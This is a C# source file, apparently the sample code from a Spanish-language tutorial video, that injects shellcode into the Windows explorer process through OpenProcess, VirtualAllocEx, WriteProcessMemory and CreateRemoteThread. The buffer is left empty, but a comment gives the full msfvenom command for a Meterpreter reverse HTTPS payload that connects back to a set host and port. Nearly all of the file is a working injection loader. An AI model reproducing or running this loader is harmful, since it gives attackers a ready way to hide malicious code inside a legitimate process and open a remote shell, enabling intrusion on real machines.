using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace ProcessInjection
{
    class Program
    {
        /*
        Ejemplo del video: 
        Por: PlainText
        */
    
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             uint processAccess,
             bool bInheritHandle,
             int processId
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess, 
            IntPtr lpAddress,
            uint dwSize, 
            AllocationType flAllocationType, 
            MemoryProtection flProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
              IntPtr hProcess,
              IntPtr lpBaseAddress,
              byte[] lpBuffer,
              Int32 nSize,
              out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes, 
            uint dwStackSize, 
            IntPtr lpStartAddress,
            IntPtr lpParameter, 
            uint dwCreationFlags, 
            out IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // Shellcode
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.133 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[] { };

            // Guardar el valor del ID del processo a injectar 
            int targetProcessId = Process.GetProcessesByName("explorer")[0].Id;

            // Obtener el handler de un proceso 
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);

            // Crear un espacio en la memoria para guardar el shellcode en el proceso selecionado
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);

            IntPtr outSize = IntPtr.Zero;

            // Copiar el Shellcode al espacio de memoria creado
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr Novalue;
            // Crear un thread (hilo) en ese proceso que ejecute el shellcode 
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out Novalue);
        }
    }
}
